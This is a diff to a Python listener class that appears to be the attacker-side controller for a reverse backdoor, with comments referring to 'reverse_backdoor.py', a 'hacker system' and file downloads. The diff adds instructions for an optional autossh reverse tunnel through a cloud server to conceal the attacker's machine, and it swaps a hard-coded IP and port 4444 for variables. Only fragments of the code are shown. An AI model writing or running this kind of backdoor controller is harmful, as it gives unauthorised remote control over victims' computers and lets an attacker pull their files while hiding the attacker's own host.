@@ -5,6 +5,8 @@
 import socket, json, base64, subprocess, sys, time
 
 class Listener:
+
+    # This function is only needed if you do not want to expose your hacker system but have an intermediary SSH server you want to expose and tunnel communication from. 
     # def setup_reverse_ssh_tunnel():
     #     command = ["autossh", "f", "-N", "-R", "6000:localhost:5000", "user@"+cloud_server_ip]
     #     while True:
@@ -81,8 +83,11 @@ class Listener:
 
             print(result) #returns for example "[+] Download successful."
 
-my_listener = Listener("172.172.186.182", 4444)
+# Hacker port should be the same as the port set in reverse_backdoor.py
+my_listener = Listener(str(hacker_privateIP), hacker_port)
 my_listener.run()
 
 
+
+# Uncomment if using the setup_reverse_ssh_tunnel() function
 # cloud_server_ip = input("Enter the public IP address of the server running your SSH reverse tunnel: ")
